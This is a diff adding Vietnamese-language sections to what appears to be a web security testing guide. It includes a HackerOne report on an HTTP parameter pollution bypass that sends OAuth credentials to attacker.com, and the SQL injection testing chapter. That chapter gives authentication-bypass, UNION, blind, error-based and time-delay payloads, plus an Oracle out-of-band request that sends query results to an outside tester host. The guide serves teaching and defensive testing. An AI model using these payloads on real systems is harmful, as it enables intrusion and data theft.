@@ -2922,3 +2922,795 @@ Cụ thể, hãy chú ý đến các phản hồi có vectơ HPP trong attribute
 
 ##### Example report
 
+Link to report: https://hackerone.com/reports/114169
+
+CHÀO,
+Tôi muốn báo cáo sự cố về xác thực web Digits cho phép kẻ tấn công truy xuất dữ liệu thông tin xác thực OAuth của nạn nhân ứng dụng được ủy quyền.
+
+**Summary:**
+
+Như được mô tả trong #108429, trang đăng nhập có 2 tham số, Consumer_key và host. Cái trước xác định ứng dụng mà người dùng muốn xác thực và cái sau chỉ định miền nào dữ liệu thông tin xác thực OAuth được gửi tới sau khi xác thực. Để ngăn các trang web khác giả làm ứng dụng, param host sẽ được xác thực để xem liệu nó có khớp với miền đã đăng ký của ứng dụng hay không. Lấy Periscope làm ví dụ:
+```
+https://www.digits.com/login?consumer_key=9I4iINIyd0R01qEPEwT9IC6RE&host=https%3A%2F%2Fwww.periscope.tv
+
+```
+host=https://www.periscope.tv khớp với miền đã đăng ký
+
+```
+https://www.digits.com/login?consumer_key=9I4iINIyd0R01qEPEwT9IC6RE&host=https%3A%2F%2Fattacker.com
+```
+
+host=https://attacker.com không khớp với tên miền đã đăng ký, do đó trang sẽ hiển thị lỗi.
+
+Tuy nhiên, có thể bỏ qua việc xác thực bằng HPP (HTTP Parameter Pollution). Nếu chúng tôi cung cấp nhiều tham số máy chủ, quá trình xác thực sẽ chỉ so sánh tham số đầu tiên nhưng thay vào đó, tham số cuối cùng được sử dụng trong bước chuyển.
+
+Ví dụ:
+
+```
+https://www.digits.com/login?consumer_key=9I4iINIyd0R01qEPEwT9IC6RE&host=https%3A%2F%2Fwww.periscope.tv&host=https%3A%2F%2Fattacker.com
+```
+
+First host (host=https://www.periscope.tv) được validate chứ không phải second host. Sau khi xác thực, second host (host=https://attacker.com) được sử dụng làm host chuyển giao thông tin.
+
+**Step to reproduce:**
+1. Chuẩn bị một tài khoản Periscope được liên kết với một số điện thoại
+2. Đăng nhập vào Periscope bằng số điện thoại có luồng digits web login: http://innerht.ml/pocs/digits-host-validation-bypass-hpp/
+3. Sau đó, tài khoản của bạn sẽ được đổi tên thành "Pwn3d"
+
+**Impact:**
+Nó ảnh hưởng đến mọi ứng dụng có Chữ số tích hợp và thậm chí cả ứng dụng chính thức (Periscope). Kẻ tấn công có thể lợi dụng lỗ hổng để đăng nhập vào tài khoản của nạn nhân trên các ứng dụng bị ảnh hưởng.
+
+**Fix:**
+Đảm bảo máy chủ được xác thực giống với máy chủ được sử dụng làm máy chủ truyền hoặc trả về lỗi nếu phát hiện thấy HPP
+
+
+
+#### 4.8.5 OTG-INPVAL-005 (Testing for SQL Injection)
+
+##### Summary:
+
+Một cuộc tấn công SQL injection bao gồm việc chèn hoặc "tiêm" một truy vấn SQL một phần hoặc toàn bộ thông qua đầu vào dữ liệu hoặc được truyền từ máy khách (trình duyệt) đến ứng dụng web. Một cuộc tấn công SQL injection thành công có thể đọc dữ liệu nhạy cảm từ cơ sở dữ liệu, sửa đổi dữ liệu cơ sở dữ liệu (chèn/cập nhật/xóa), thực hiện các thao tác quản trị trên cơ sở dữ liệu (chẳng hạn như tắt DBMS), khôi phục nội dung của một tệp đã cho hiện có trên tệp DBMS hệ thống hoặc ghi tệp vào hệ thống tệp và trong một số trường hợp, ra lệnh cho hệ điều hành. Các cuộc tấn công SQL injection là một kiểu injection attack, trong đó các lệnh SQL được đưa vào đầu vào của data-plane để tác động đến việc thực thi các lệnh SQL được xác định trước.
+
+Nói chung, cách các ứng dụng web xây dựng các câu lệnh SQL liên quan đến cú pháp SQL do các lập trình viên viết được trộn lẫn với dữ liệu do người dùng cung cấp. Ví dụ:
+
+```
+select title, text from news where id=$id
+```
+
+Trong ví dụ trên, biến $id chứa dữ liệu do người dùng cung cấp, trong khi phần còn lại là phần tĩnh SQL do lập trình viên cung cấp; tạo ra câu lệnh dynamic SQL.
+
+Do cách nó được xây dựng, người dùng có thể cung cấp đầu vào được tạo thủ công để cố gắng làm cho câu lệnh SQL ban đầu thực hiện các hành động tiếp theo do người dùng lựa chọn. Ví dụ dưới đây minh họa dữ liệu do người dùng cung cấp “10 or 1=1”, thay đổi logic của câu lệnh SQL, sửa đổi mệnh đề WHERE thêm điều kiện “or 1=1”.
+
+Các cuộc tấn công SQL Injection có thể được chia thành ba loại sau:
+
+- Inband: dữ liệu được trích xuất bằng cùng một kênh được sử dụng để chèn mã SQL. Đây là kiểu tấn công đơn giản nhất, trong đó dữ liệu thu được được hiển thị trực tiếp trên trang web của ứng dụng.
+- Out-of-band: dữ liệu được truy xuất bằng một kênh khác (ví dụ: email có kết quả của truy vấn được tạo và gửi đến người kiểm tra).
+- Inferential hoặc Blind: không có chuyển dữ liệu thực tế, nhưng người kiểm tra có thể tái tạo lại thông tin bằng cách gửi các yêu cầu cụ thể và quan sát hành vi kết quả của DB Server.
+
+Một cuộc tấn công SQL Injection thành công yêu cầu kẻ tấn công tạo một Truy vấn SQL chính xác về mặt cú pháp. Nếu ứng dụng trả về một thông báo lỗi được tạo bởi một truy vấn không chính xác, thì kẻ tấn công có thể dễ dàng xây dựng lại logic của truy vấn ban đầu và do đó, hiểu cách thực hiện thao tác tiêm một cách chính xác. Tuy nhiên, nếu ứng dụng ẩn các chi tiết lỗi, thì người kiểm tra phải có khả năng đảo ngược logic của truy vấn ban đầu.
+
+Về các kỹ thuật khai thác lỗ hổng SQL injection, có năm kỹ thuật phổ biến. Ngoài ra, những kỹ thuật đó đôi khi có thể được sử dụng theo cách kết hợp (ví dụ: union operator và out-of-band):
+
+- UNION Operator: có thể được sử dụng khi lỗ hổng SQL injection xảy ra trong câu lệnh SELECT, giúp có thể kết hợp hai truy vấn thành một kết quả hoặc tập kết quả duy nhất.
+- Boolean: sử dụng (các) điều kiện Boolean để xác minh xem một số điều kiện là đúng hay sai.
+- Error based: kỹ thuật này buộc cơ sở dữ liệu tạo ra lỗi, cung cấp cho kẻ tấn công hoặc người kiểm tra thông tin để tinh chỉnh nội dung injection của chúng.
+- Out-of-band: kỹ thuật được sử dụng để truy xuất dữ liệu bằng một kênh khác (ví dụ: tạo kết nối HTTP để gửi kết quả đến máy chủ web).
+- Time delay: sử dụng các lệnh cơ sở dữ liệu (ví dụ: sleep) để trì hoãn câu trả lời trong các truy vấn có điều kiện. Nó rất hữu ích khi kẻ tấn công không có một số loại response (resul, output hoặc error) từ ứng dụng.
+
+**How to Test**
+
+*Detection techniques*
+
+Bước đầu tiên trong test này là hiểu khi nào ứng dụng tương tác với một DB Server để truy suất dữ liệu. Ví dụ điển hình của các trường hợp khi một ứng dụng cần giao tiếp với một DB Server bao gồm:
+
+- Authentication forms: Khi việc xác thực sử dụng web form được diễn ra, rất có thể rằng thông tin đăng nhập của user sẽ được check với database nơi mà chứa tất cả thông tin về usernames và passwords (hoặc an toàn hơn là password đã bị hash)
+- Search engines: Chuỗi được gửi bở người dùng có thể được sử dụng trong một câu SQL query, cái mà sẽ trích xuất tất cả các bản ghi có liên quan từ database.
+- E-Commerce sites: Những sản phẩm và những thông tin liên quan (giá, mô tả, trạng thái,...) rất có khả năng được lưu trữ trong cơ sở dữ liệu.
+
+Người kiểm thử phải tạo ra một list tất cả các input fields, cái mà value của nó có thể được sử dụng trong một SQL query, bao gồm cả hidden fields của POST requests và sau đó test chúng một cách riêng biệt, cố gắng can thiệp vào câu truy vấn và tạo ra lỗi. Ngoài ra cũng nên test thêm các HTTP headers và Cookies.
+
+Test case đầu tiên thường bao gồm việc thêm dấu nháy đơn `'` hoặc dấu chấm phẩy `;` vào field hoặc param đang test. Cái đầu tiên (`'`) được sử dụng để đóng chuỗi và nếu nó không bị filter bởi ứng dụng nó sẽ dẫn đến một câu truy vấn sai. Cái thứ 2 (`;`) được sử dụng để kết thúc một câu truy vấn và nếu nó không được filter, nó cũng sẽ tạo ra lỗi.
+
+Output của một vulnerable field có thể trông như sau (Microsoft SQL Server):
+```
+Microsoft OLE DB Provider for ODBC Drivers error '80040e14'
+[Microsoft][ODBC SQL Server Driver][SQL Server]Unclosed quotation mark before the 
+character string ''.
+/target/target.asp, line 113
+```
+
+Ngoài ra cũng có thể sử dụng comment (-- hoặc /* */,...) và các SQL keywords khác như `AND` và `OR` có thể được sử dụng để sửa câu query. Một kỹ thuật rất đơn giản nhưng đôi khi vẫn hiệu quả vì có thể tạo ra lỗi như sau:
+
+```
+Microsoft OLE DB Provider for ODBC Drivers error '80040e07'
+[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the
+varchar value 'test' to a column of data type int.
+/target/target.asp, line 113
+```
+
+Quan sát tất cả các response từ web server và xem cả HTML/javascript source code. Đôi khi lỗi có tồn tại nhưng vì một vài lý do (javascript error, HTML comment,...) không hiển thị nó với người dùng. Toàn bộ một message thông báo lỗi giống như ví dụ cung cấp rất nhiều thông tin cho tester dẫn đến một cuộc tấn công injection thành công. Tuy nhiên, ứng dụng thường không cung cấp quá chi tiết: chỉ đơn giản '500 Server Error' hoặc một trang web được xây dựng để thông báo lỗi, điều này nghĩa là chúng ta cần sử dụng Blind injection techniques. Trong một số trường hợp, Việc test từng field một là rất quan trọng: chỉ field thay đổi trong khi các fields khác dữ nguyên sẽ giúp ta hiểu chính xác đâu là vulnerable param, đâu không phải.
+
+*Standard SQL Injection Testing*
+
+Example 1 (classical SQL Injection):
+
+Quan sát câu SQL bên dưới:
+```
+SELECT * FROM Users WHERE Username='$username' AND Password='$password'
+```
+
+Một truy vấn tương tự thường được sử dụng từ ứng dụng web để xác thực người dùng. Nếu truy vấn trả về một giá trị, điều đó có nghĩa là bên trong cơ sở dữ liệu tồn tại một người dùng có bộ thông tin xác thực đó, thì người dùng đó được phép đăng nhập vào hệ thống, nếu không thì quyền truy cập sẽ bị từ chối. Các giá trị của các trường đầu vào thường được lấy từ người dùng thông qua một biểu mẫu web. Giả sử chúng ta chèn các giá trị Username và Password sau:
+```
+$username = 1' or '1' = '1
+```
+```
+$password = 1' or '1' = '1
+```
+
+Câu truy vấn sẽ là:
+```
+SELECT * FROM Users WHERE Username='1' OR '1' = '1' AND Password='1' OR '1' = '1' 
+```
+
+Giả sử rằng giá trị của các param trên được gửi thông qua phương thức GET và trang web bị lỗi là trang `www.example.com`, thì request chúng ta gửi đến server sẽ có dạng như sau:
+```
+http://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1&password=1'%20or%20'1'%20=%20'1 
+```
+
+Sau khi phân tích ta thấy rằng câu truy vấn trả về một (hoặc nhiều) các giá trị bởi vì điều kiện của query là luôn đúng (1=1). Theo cách này, hệ thống đã xác thực người dùng mà không cần biết username và password. 
+
+Trong một số hệ thống hàng đầu tiên của bảng user sẽ là tài khoản admin. Tài khoản đó nó có lẽ sẽ được trả về trong một số trường hợp. Một số ví dụ khác về câu query như sau:
+
+```
+SELECT * FROM Users WHERE ((Username='$username') AND (Password=MD5('$password')))
+```
+
+Trong trường hợp này, có hai vấn đề, một do sử dụng dấu ngoặc đơn và một do sử dụng hàm hash MD5. Trước hết, chúng tôi giải quyết vấn đề về dấu ngoặc đơn. Điều đó chỉ đơn giản bao gồm việc thêm một số dấu ngoặc đơn đóng cho đến khi chúng tôi nhận được một truy vấn đã sửa. Để giải quyết vấn đề thứ hai, chúng tôi cố gắng trốn tránh điều kiện thứ hai. Chúng tôi thêm vào truy vấn của mình một ký hiệu comment đang bắt đầu. Theo cách này, mọi thứ theo sau ký tự như vậy được coi là một comment. Mọi DBMS đều có cú pháp comment riêng, tuy nhiên, một ký hiệu phổ biến đối với phần lớn cơ sở dữ liệu là /*. Trong Oracle ký hiệu là "--". Điều này nói rằng, các giá trị mà chúng tôi sẽ sử dụng làm Username dùng và Password là:
+
+```
+$username = 1' or '1' = '1'))/*
+```
+```
+$password = foo
+```
+
+Bằng cách này chúng ta sẽ có được câu query như bên dưới:
+```
+SELECT * FROM Users WHERE ((Username='1' or '1' = '1'))/*') AND (Password=MD5('$password'))) 
+```
+
+Request trên url sẽ là:
+```
+http://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1'))/*&password=foo 
+```
+
+Điều này có lẽ sẽ trả về một số các giá trị. Thỉnh thoảng, code xác thực kiểm tra số lượng bản ghi/kết quả trả về phải chính xác bằng 1. Trong ví dụ trước, trường hợp này sẽ trở nên khó hơn (trong database chỉ có 1 giá trị cho mỗi user). Để giải quyết vấn đề này, nó yêu cầu điều kiện về số kết quả trả về phải bằng 1. Để đạt được mục tiêu này chúng ta sử dụng toán tử `LIMIT <num>`, với `<num>` là số kết quả/bản ghi chúng ta muốn trả về. Dựa theo ví dụ trước ta sửa trường Username và Password như sau:
+```
+$username = 1' or '1' = '1')) LIMIT 1/*
+```
+```
+$password = foo 
+```
+
+Theo cách này chúng ta có request như sau:
+```
+http://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1'))%20LIMIT%201/*&password=foo 
+```
+
+Example 2 (simple SELECT statement):
+
+Quan sát câu query bên dưới:
+```
+SELECT * FROM products WHERE id_product=$id_product
+```
+
+Quan sát request khi thực thi câu query bên trên:
+```
+http://www.example.com/product.php?id=10
+```
+
+Khi tester thử một vài giá trị hợp lệ (ví dụ 10 giá trị), ứng dụng sẽ trả về thông tin của sản phẩm. Một cách rất hay để test liệu ứng dụng có tồn lại lỗ hổng hay không trong kịch bản này là sử dụng logic bằng những toán tử như AND và OR
+
+Quan sát request:
+```
+http://www.example.com/product.php?id=10 AND 1=2
+```
+```
+SELECT * FROM products WHERE id_product=10 AND 1=2
+```
+
+Trong trường hợp này, có thể ứng dụng sẻ trả về một vài thông báo nói với chúng ta rằng không có content hợp lệ hoặc một page trắng. Sau đó tester có thể gửi câu truy vấn đúng kiểm tra liệu có kết quả hợp lệ trả về không:
+```
+http://www.example.com/product.php?id=10 AND 1=1
+```
+
+Example 3 (Stacked queries):
+
+Dựa trên API, cái mà ứng dụng web đang sử dụng với DBMS (ví dụ: PHP + PostgreSQL, ASP+SQL SERVER) nó có thể thực hiện đa truy vấn trong một lần gọi.
+
+Quan sát câu truy vấn SQL bên dưới:
+```
+SELECT * FROM products WHERE id_product=$id_product
+```
+
+Một cách để khai thác kịch bản bên trên sẽ là:
+```
+http://www.example.com/product.php?id=10; INSERT INTO users (…)
+```
+
+Cách này có thể thực thi nhiều câu truy vấn trong 1 hàng và độc lập với câu query thứ nhất.
+
+
+*Fingerprinting the Database:*
+
+Mặc dù ngôn ngữ SQL là một tiêu chuẩn, nhưng mỗi DBMS đều có tính đặc thù và khác nhau ở nhiều khía cạnh như các lệnh đặc biệt, chức năng truy xuất dữ liệu như tên người dùng và cơ sở dữ liệu, tính năng, dòng nhận xét, v.v.
+
+Khi tester chuyển sang khai thác SQL injection nâng cao hơn, họ cần biết cơ sở dữ liệu backend là gì.
+
+1. Cách đầu tiên để tìm ra cơ sở dữ liệu phía sau nào được sử dụng là quan sát lỗi do ứng dụng trả về. Sau đây là một số ví dụ về thông báo lỗi:
+
+    MySql:
+    ```
+    You have an error in your SQL syntax; check the manual
+    that corresponds to your MySQL server version for the
+    right syntax to use near '\'' at line 1
+    ```
+    Một UNION SELECT hoàn chỉnh với version() cũng có thể giúp biết cơ sở dữ liệu phía sau.
+    ```
+    SELECT id, name FROM users WHERE id=1 UNION SELECT 1, version() limit 1,1
+    ```
+
+    Oracle:
+    ```
+    ORA-00933: SQL command not properly ended
+    ```
+
+    MS SQL Server:
+    ```
+    Microsoft SQL Native Client error ‘80040e14’
+    Unclosed quotation mark after the character string
+    ```
+    ```
+    SELECT id, name FROM users WHERE id=1 UNION SELECT 1, @@version limit 1, 1
+    ```
+
+    PostgreSQL:
+    ```
+    Query failed: ERROR: syntax error at or near
+    "’" at character 56 in /www/site/test.php on line 121.
+    ```
+
+2. Nếu không có thông báo lỗi hoặc thông báo lỗi tùy chỉnh, người kiểm tra có thể thử đưa vào các trường chuỗi bằng các kỹ thuật nối khác nhau:
+
+    ```
+    --------------------------------
+    MySql       :      'test' + 'ing'
+    SQL Server  :      'test' 'ing'
+    Oracle      :      'test'||'ing'
+    PostgreSQL  :      'test'||'ing'
+    ```
+
+
+*Exploitation Techniques:*
+
+Union Exploitation Technique:
+
+Toán tử UNION được sử dụng trong các lần tiêm SQL để tham gia một truy vấn, do tester cố ý giả mạo, với truy vấn ban đầu. Kết quả của truy vấn giả mạo sẽ được nối với kết quả của truy vấn ban đầu, cho phép người kiểm tra thu được giá trị của các cột trong các bảng khác. Giả sử đối với các ví dụ của chúng tôi rằng truy vấn được thực thi từ máy chủ như sau:
+
+SELECT Name, Phone, Address FROM Users WHERE Id=$id
+
+Chúng tôi sẽ đặt giá trị $id sau:
+```
+$id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable
+```
+
+Chúng ta sẽ có câu truy vấn sau:
+```
+SELECT Name, Phone, Address FROM Users WHERE Id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable
+```
+
+Cái này sẽ kết hợp kết quả của truy vấn ban đầu với tất cả các số thẻ tín dụng trong bảng CreditCardTable. Từ khóa ALL là cần thiết để giải quyết các truy vấn sử dụng từ khóa DISTINCT. Hơn nữa, chúng tôi nhận thấy rằng ngoài số thẻ tín dụng, chúng tôi đã chọn hai giá trị khác. Hai giá trị này là cần thiết vì hai truy vấn phải có số tham số/cột bằng nhau để tránh lỗi cú pháp.
+
+Chi tiết đầu tiên mà tester cần để khai thác lỗ hổng SQL injection bằng kỹ thuật như vậy là tìm đúng số cột trong câu lệnh SELECT.
+
+Để đạt được điều này, tester có thể sử dụng mệnh đề ORDER BY theo sau là một số cho biết số lượng cột của cơ sở dữ liệu được chọn:
+```
+http://www.example.com/product.php?id=10 ORDER BY 10--
+```
+
+Nếu truy vấn thực thi thành công, người kiểm tra có thể giả sử, trong ví dụ này, có 10 cột trở lên trong câu lệnh CHỌN. Nếu truy vấn không thành công thì phải có ít hơn 10 cột được truy vấn trả về. Nếu có một thông báo lỗi, nó có thể là:
+```
+Unknown column '10' in 'order clause'
+```
+
+Sau khi người kiểm tra tìm ra số cột, bước tiếp theo là tìm ra loại cột. Giả sử có 3 cột trong ví dụ trên, người kiểm tra có thể thử từng loại cột, sử dụng giá trị NULL để giúp họ:
+
+```
+http://www.example.com/product.php?id=10 UNION SELECT 1,null,null--
+```
+
+Nếu truy vấn không thành công, người kiểm tra có thể sẽ thấy một thông báo như:
+```
+All cells in a column must have the same datatype
+```
+
+Nếu truy vấn thực hiện thành công, cột đầu tiên có thể là một số nguyên. Sau đó, người thử nghiệm có thể di chuyển xa hơn và cứ thế:
+```
+http://www.example.com/product.php?id=10 UNION SELECT 1,1,null--
+```
+
+Sau khi thu thập thông tin thành công, tùy thuộc vào ứng dụng, nó có thể chỉ hiển thị cho người kiểm tra kết quả đầu tiên, vì ứng dụng chỉ xử lý dòng đầu tiên của tập kết quả. Trong trường hợp này, có thể sử dụng mệnh đề LIMIT hoặc người kiểm tra có thể đặt giá trị không hợp lệ, khiến chỉ truy vấn thứ hai hợp lệ (giả sử không có mục nào trong cơ sở dữ liệu có ID là 99999):
+```
+http://www.example.com/product.php?id=99999 UNION SELECT 1,1,null--
+```
+
+Boolean Exploitation Technique
+
+Kỹ thuật khai thác Boolean rất hữu ích khi người kiểm tra tìm thấy một tình huống Blind SQL Injection, trong đó không có gì được biết về kết quả của một hoạt động. Ví dụ: hành vi này xảy ra trong trường hợp lập trình viên đã tạo một trang lỗi tùy chỉnh không tiết lộ bất kỳ điều gì trên cấu trúc của truy vấn hoặc trên cơ sở dữ liệu. (Trang không trả về lỗi SQL, nó chỉ có thể trả về HTTP 500, 404 hoặc chuyển hướng).
+
+Bằng cách sử dụng các phương pháp suy luận, có thể tránh được trở ngại này và do đó thành công trong việc khôi phục các giá trị của một số trường mong muốn. Phương pháp này bao gồm thực hiện một loạt các truy vấn boolean đối với máy chủ, quan sát các câu trả lời và cuối cùng suy ra ý nghĩa của các câu trả lời đó. Như mọi khi, chúng tôi xem xét miền www.example.com và chúng tôi cho rằng miền này chứa tham số có tên là id dễ bị tấn công bằng SQL injection. Điều này có nghĩa là thực hiện yêu cầu sau:
+```
+http://www.example.com/index.php?id=1'
+```
+
+Chúng tôi sẽ nhận được một trang có lỗi thông báo tùy chỉnh do lỗi cú pháp trong truy vấn. Chúng tôi cho rằng truy vấn được thực hiện trên máy chủ là:
+```
+SELECT field1, field2, field3 FROM Users WHERE Id='$Id' 
+```
+
+Có thể khai thác thông qua các phương pháp đã thấy trước đây. Những gì chúng tôi muốn lấy là các giá trị của trường tên người dùng. Các thử nghiệm mà chúng tôi sẽ thực hiện sẽ cho phép chúng tôi lấy giá trị của trường tên người dùng, trích xuất giá trị đó theo từng ký tự. Điều này có thể thực hiện được thông qua việc sử dụng một số chức năng tiêu chuẩn, hiện diện trong thực tế mọi cơ sở dữ liệu. Đối với các ví dụ của chúng tôi, chúng tôi sẽ sử dụng các hàm giả sau:
+
+**SUBSTRING(text, start, length):** trả về một chuỗi con bắt đầu từ vị trí "start" của văn bản và có độ dài "length". Nếu "start" lớn hơn độ dài của văn bản, hàm sẽ trả về giá trị null.
+
+**ASCII (char):** nó trả về giá trị ASCII của ký tự đầu vào. Giá trị null được trả về nếu char bằng 0.
+
+**LENGTH (text):** trả về số lượng ký tự trong văn bản đầu vào.
+
+Thông qua các chức năng như vậy, chúng tôi sẽ thực hiện các thử nghiệm của mình trên ký tự đầu tiên và khi chúng tôi phát hiện ra giá trị, chúng tôi sẽ chuyển sang ký tự thứ hai, v.v., cho đến khi chúng tôi phát hiện ra toàn bộ giá trị. Các bài kiểm tra sẽ tận dụng chức năng SUBSTRING, để chỉ chọn một ký tự tại một thời điểm (chọn một ký tự đơn lẻ có nghĩa là áp đặt tham số độ dài thành 1) và chức năng ASCII, để lấy giá trị ASCII, để chúng ta có thể làm so sánh số. Kết quả so sánh sẽ được thực hiện với tất cả các giá trị của bảng ASCII, cho đến khi tìm được giá trị phù hợp. Ví dụ: chúng tôi sẽ sử dụng giá trị sau cho Id:
+```
+$Id=1' AND ASCII(SUBSTRING(username,1,1))=97 AND '1'='1 
+```
+
+Điều đó tạo ra truy vấn sau (từ bây giờ, chúng tôi sẽ gọi nó là "truy vấn suy luận"):
+```
+SELECT field1, field2, field3 FROM Users WHERE Id='1' AND ASCII(SUBSTRING(username,1,1))=97 AND '1'='1'
+```
+
+Ví dụ trước trả về kết quả khi và chỉ khi ký tự đầu tiên của tên người dùng trường bằng giá trị ASCII 97. Nếu chúng tôi nhận được giá trị sai, thì chúng tôi tăng chỉ mục của bảng ASCII từ 97 lên 98 và chúng tôi lặp lại yêu cầu . Thay vào đó, nếu chúng tôi nhận được một giá trị thực, chúng tôi đặt chỉ mục của bảng ASCII thành 0 và chúng tôi phân tích ký tự tiếp theo, sửa đổi các tham số của hàm SUBSTRING. Vấn đề là hiểu theo cách nào chúng ta có thể phân biệt các bài kiểm tra trả về giá trị thực với các bài kiểm tra trả về giá trị sai. Để làm điều này, chúng tôi tạo một truy vấn luôn trả về false. Điều này có thể thực hiện được bằng cách sử dụng giá trị sau cho Id:
+```
+$Id=1' AND '1' = '2 
+```
+
+Cái nào sẽ tạo truy vấn sau:
+```
+SELECT field1, field2, field3 FROM Users WHERE Id='1' AND '1' = '2' 
+```
+
+Phản hồi thu được từ máy chủ (đó là mã HTML) sẽ là giá trị sai cho các thử nghiệm của chúng tôi. Điều này đủ để xác minh xem giá trị thu được từ việc thực hiện truy vấn suy luận có bằng với giá trị thu được với thử nghiệm được thực hiện trước đó hay không. Đôi khi, phương pháp này không hoạt động. Nếu máy chủ trả về hai trang khác nhau do hai yêu cầu web liên tiếp giống hệt nhau, chúng tôi sẽ không thể phân biệt giá trị thực với giá trị sai. Trong những trường hợp cụ thể này, cần phải sử dụng các bộ lọc cụ thể cho phép chúng tôi loại bỏ mã thay đổi giữa hai yêu cầu và để lấy mẫu. Sau này, đối với mỗi yêu cầu suy luận được thực thi, chúng tôi sẽ trích xuất mẫu tương đối từ phản hồi bằng cách sử dụng cùng chức năng và chúng tôi sẽ thực hiện kiểm soát giữa hai mẫu để quyết định kết quả của thử nghiệm.
+
+Trong phần thảo luận trước, chúng ta chưa giải quyết vấn đề xác định điều kiện kết thúc cho các phép thử out, nghĩa là khi nào chúng ta nên kết thúc thủ tục suy diễn. Một kỹ thuật để thực hiện điều này sử dụng một đặc tính của hàm SUBSTRING và hàm LENGTH. Khi kiểm tra so sánh ký tự hiện tại với mã ASCII 0 (nghĩa là giá trị null) và kiểm tra trả về giá trị true, thì hoặc chúng tôi đã hoàn thành quy trình suy luận (chúng tôi đã quét toàn bộ chuỗi) hoặc giá trị chúng tôi có được phân tích chứa ký tự null.
+
+Chúng tôi sẽ chèn giá trị sau cho trường Id:
+```
+$Id=1' AND LENGTH(username)=N AND '1' = '1 
+```
+
+Trong đó N là số ký tự mà chúng tôi đã phân tích cho đến bây giờ (không tính giá trị null). Truy vấn sẽ là:
+```
+SELECT field1, field2, field3 FROM Users WHERE Id='1' AND LENGTH(username)=N AND '1' = '1' 
+```
+
+Truy vấn trả về đúng hoặc sai. Nếu chúng tôi có được giá trị đúng, thì chúng tôi đã hoàn thành suy luận và do đó, chúng tôi biết giá trị của tham số. Nếu chúng tôi nhận được sai, điều này có nghĩa là ký tự null có trong giá trị của tham số và chúng tôi phải tiếp tục phân tích tham số tiếp theo cho đến khi chúng tôi tìm thấy một giá trị null khác.
+
+Tấn công SQL injection mù quáng cần một khối lượng truy vấn lớn. Người kiểm tra có thể cần một công cụ tự động để khai thác lỗ hổng.
+
+
+
+Error based Exploitation technique
+
+Kỹ thuật khai thác dựa trên lỗi rất hữu ích khi người kiểm tra vì lý do nào đó không thể khai thác lỗ hổng SQL injection bằng kỹ thuật khác như UNION. Kỹ thuật dựa trên Lỗi bao gồm việc buộc cơ sở dữ liệu thực hiện một số thao tác trong đó kết quả sẽ là lỗi. Vấn đề ở đây là cố gắng trích xuất một số dữ liệu từ cơ sở dữ liệu và hiển thị nó trong thông báo lỗi. Kỹ thuật khai thác này có thể khác nhau giữa DBMS với DBMS (kiểm tra phần cụ thể của DBMS).
+
+Quan sát câu query dưới đây:
+```
+SELECT * FROM products WHERE id_product=$id_product
+```
+
+Quan sát request khi thực thi query trên:
+```
+http://www.example.com/product.php?id=10
+```
+
+Request độc hại có thể là (ví dụ: Oracl 10g):
+```
+http://www.example.com/product.php?id=10||UTL_INADDR.GET_HOST_NAME( (SELECT user FROM DUAL) )--
+```
+
+Trong ví dụ này, tester đang nối giá trị 10 với kết quả của hàm `UTL_INADDR.GET_HOST_NAME`. Hàm này của Oracle sẽ cố gắng trả về tên máy chủ của tham số được truyền cho nó, đó là truy vấn khác, tên của người dùng. Khi cơ sở dữ liệu tìm tên máy chủ với tên cơ sở dữ liệu người dùng, nó sẽ không thành công và trả về thông báo lỗi như:
+```
+ORA-292257: host SCOTT unknown
+```
+
+Sau đó, người kiểm tra có thể thao tác với tham số được truyền cho hàm GET_HOST_NAME() và kết quả sẽ được hiển thị trong thông báo lỗi.
+
+
+
+Out of band Exploitation technique
+
+Kỹ thuật này rất hữu ích khi người kiểm tra tìm thấy một tình huống Blind SQL Injection, trong đó không có gì được biết về kết quả của một thao tác. Kỹ thuật này bao gồm việc sử dụng các chức năng DBMS để thực hiện kết nối ngoài băng tần và cung cấp kết quả của truy vấn được đưa vào như một phần của yêu cầu tới máy chủ của người kiểm tra. Giống như các kỹ thuật dựa trên lỗi, mỗi DBMS có các chức năng riêng của nó. Kiểm tra phần DBMS cụ thể.
+
+Quan sát câu query bên dưới:
+```
+SELECT * FROM products WHERE id_product=$id_product
+```
+
+Quan sát request khi thực hiện câu query trên:
+```
+http://www.example.com/product.php?id=10
+```
+
+Request độc hại có thể là:
+```
+http://www.example.com/product.php?id=10||UTL_HTTP.request(‘testerserver.com:80’||(SELECT user FROM DUAL)--
+```
+
+Trong ví dụ này, trình kiểm tra đang nối giá trị 10 với kết quả của hàm UTL_HTTP.request. Chức năng này của Oracle sẽ cố gắng kết nối với `testerserver` và tạo một yêu cầu HTTP GET chứa kết quả trả về từ truy vấn “SELECT user FROM DUAL”. Người thử nghiệm có thể thiết lập máy chủ web (ví dụ: Apache) hoặc sử dụng công cụ Netcat:
+```
+/home/tester/nc –nLp 80
+ 
+GET /SCOTT HTTP/1.1
+Host: testerserver.com
+Connection: close
+```
+
+
+
+Time delay Exploitation technique
+
+Kỹ thuật khai thác độ trễ thời gian rất hữu ích khi người kiểm tra tìm thấy tình huống Blind SQL Injection, trong đó không có gì được biết về kết quả của một thao tác. Kỹ thuật này bao gồm việc gửi một truy vấn được đưa vào và trong trường hợp điều kiện là đúng, người kiểm tra có thể theo dõi thời gian cần thiết để máy chủ phản hồi. Nếu có độ trễ, người kiểm tra có thể cho rằng kết quả của truy vấn có điều kiện là đúng. Kỹ thuật khai thác này có thể khác nhau giữa DBMS với DBMS (kiểm tra phần cụ thể của DBMS).
+
+Hãy xem xét truy vấn SQL sau:
+```
+SELECT * FROM products WHERE id_product=$id_product
+```
+
+Quan sát request khi thực hiện câu query trên:
+```
+http://www.example.com/product.php?id=10
+```
+
+Request độc hại có thể là (ví dụ: MySql 5.x):
+```
+http://www.example.com/product.php?id=10 AND IF(version() like ‘5%’, sleep(10), ‘false’))--
+```
+
+Trong ví dụ này, người kiểm tra đang kiểm tra xem phiên bản MySql có phải là 5.x hay không, khiến máy chủ trì hoãn câu trả lời trong 10 giây. Người kiểm tra có thể tăng thời gian trễ và theo dõi phản hồi. Người thử nghiệm cũng không cần đợi phản hồi. Đôi khi anh ta có thể đặt một giá trị rất cao (ví dụ: 100) và hủy yêu cầu sau vài giây.
+
+
+
+Stored Procedure Injection
+
